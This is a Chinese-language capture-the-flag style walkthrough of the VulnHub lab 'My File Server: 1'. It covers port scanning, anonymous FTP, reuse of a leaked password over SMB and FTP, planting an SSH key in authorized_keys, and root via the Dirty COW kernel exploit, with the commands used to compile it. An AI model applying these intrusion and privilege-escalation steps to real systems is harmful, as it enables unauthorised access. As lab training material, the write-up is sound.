---
title: MyFileServer-1
author: Creexile
date: 2024-12-19 18:48:06
lastMod: 2024-12-19
summary: 'easyNo.1'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [信息收集, 提权, 渗透]
---

# My File Server: 1

---

easyNo.1

> 来源: [vulnhub靶场-My File Server: 1](https://www.vulnhub.com/entry/my-file-server-1,432/)
>
> 目标: get root
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

- kali: 192.168.56.5
- target: 192.168.56.104

## 信息收集

```bash
nmap -sS 192.168.56.0/24

21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
445/tcp  open  microsoft-ds
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
```

再用`-A`进行详细扫描, 发现如下:

- 21/ftp 允许匿名登录
- 2121/ftp 允许匿名登录
- OS居然是windows, 可能是虚拟机

http访问, 只有一个跳转链接, 甚至是卖课的; 利用目录扫描扫描到readme.txt, 内容如下:

```
My Password is
rootroot1
```

利用cewl爬可用字符串, 爆破发现无用

ftp匿名登录, 两个都是日志信息

```
ftp 192.168.56.104
anonymous
```

尝试利用nfs挂载目录到本地, 失败; rpc更是只有信息无法利用; 那就只剩下445端口的smb服务辽

```bash
# 查看共享文件夹信息
smbmap -H 192.168.56.104
```

四个用户只有一个可以访问, 那就看看详细信息; 需要密码, 试了一下之前发现的`rootroot1`发现可以登录

```bash
# 查看详细信息
smbclient //192.168.56.104/smbdata
smbuser
```

但是还是这个日志界面, 那就审计呗, 这一大堆日志

secure文件中新增了用户`smbuser`, 同时还有密码`chauthtok`, 但是根据sshd_config可得, 只能通过公钥登录

## getshell

在测试ftp的时候发现利用`rootroot1`也可以登录`smbuser`的ftp, 且查看所在路径的时候是在`smbuser`用户目录下, 那就可以写公钥了

```bash
# kali在root权限生成rsa密钥对
ssh-keygen -t rsa
cd /root/.ssh
cat id_rsa.pub
echo '刚才id_rsa.pub的内容' > authorized_keys

# 在这个目录登录ftp
mkdir .ssh
cd .ssh
put authorized_keys
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241219174546.png)

此时再登录即可getshell

## 信息收集

```bash
# 系统信息 Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 11:36:42 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
uname -a
# 内核版本 3.10.0-229.el7.x86_64
uname -r
# 查看环境
gcc -v
python -h
# 查看特权文件, 没啥东西
find / -perm -4000 2>/dev/null
# 自启动看看, 没东西
cat /etc/crontab
```

看看/etc/passwd, 没有其他用户; 这下只能用脚本跑了

测试了一堆还是脏牛好用, 编译后直接运行即可拿到flag

```bash
# 文件位置
locate linux/local/40616.c
# 编译方式
gcc 40616.c -o 40616 -pthread
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241219182001.png)

最后flag在root文件夹下

> 报错退出后不知道为什么运行不了第二次, 删掉`/tmp/bak`后, 运行`./40616 123456`又可以了
>
> 过一会就会 Broken pipe报错退出, 尽快完成
